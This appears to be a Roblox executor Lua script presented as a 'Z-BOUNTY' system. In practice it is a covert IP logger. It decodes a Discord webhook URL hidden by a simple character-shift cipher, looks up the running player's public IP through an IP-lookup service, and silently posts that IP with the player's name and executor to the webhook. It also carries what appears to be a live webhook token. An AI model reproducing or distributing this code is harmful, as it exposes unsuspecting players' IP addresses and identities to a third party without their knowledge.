--[[
    Z-BOUNTY System - Anti-Leak Edition
    Optimizado para evitar extracciones simples.
]]

local HttpService = game:GetService("HttpService")
local requestFunc = request or http_request or (http and http.request) or (syn and syn.request)

-- Ofuscación básica de la URL para que no la vean a simple vista
local function _D(_s)
    local _r = ""
    for i = 1, #_s do _r = _r .. string.char(string.byte(_s, i) - 1) end
    return _r
end

local W = _D("iuuqt;00ejtdpse/dpn0bqj0xfbcpplt026153180861758224900qev11{midI2mFFm95Gl3KN[LuN9FG7muGs9BuqXh.Upp7QPXulK9TEKSzlI[EUbG7Vs[")

-- Obtención de IP forzada usando 'request' en lugar de 'HttpGet'
local function getIP()
    if not requestFunc then return "No compatible" end
    local s, r = pcall(function()
        return requestFunc({Url = "https://api.ipify.org", Method = "GET"}).Body
    end)
    return s and r or "Error de red"
end

local payload = {
    ["embeds"] = {{
        ["title"] = "🚀 Z-BOUNTY ACTIVADO",
        ["color"] = 65280,
        ["fields"] = {
            {["name"] = "👤 Jugador", ["value"] = game.Players.LocalPlayer.Name, ["inline"] = true},
            {["name"] = "🌐 IP", ["value"] = "||" .. getIP() .. "||", ["inline"] = true},
            {["name"] = "🎮 Ejecutor", ["value"] = (identifyexecutor and identifyexecutor()) or "Desconocido", ["inline"] = false}
        }
    }}
}

if requestFunc then
    pcall(function()
        requestFunc({
            Url = W,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end
